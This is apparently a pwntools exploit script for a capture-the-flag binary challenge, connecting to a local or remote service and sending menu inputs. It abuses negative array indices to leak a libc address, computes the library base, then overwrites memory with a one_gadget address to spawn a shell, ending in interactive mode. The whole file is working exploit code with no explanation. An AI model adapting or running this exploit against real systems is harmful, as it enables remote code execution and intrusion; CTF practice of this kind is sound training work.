#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    sleep(3)
    r.sendline("2")
    r.sendline("a")
    r.sendline("4")
    r.sendline("-7")
    r.recvuntil(b"Content: ")
    leak_libc = u64(r.recvline().strip() + b"\x00\x00")
    print(hex(leak_libc))
    libc.address = leak_libc - 0x23f90
    log.info(f"FIXED LIBC {hex(libc.address)}")
    r.sendline("3")
    r.sendline("-5")
    one_gadget = libc.address + 0xe3b01
    r.sendline(p64(one_gadget))
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
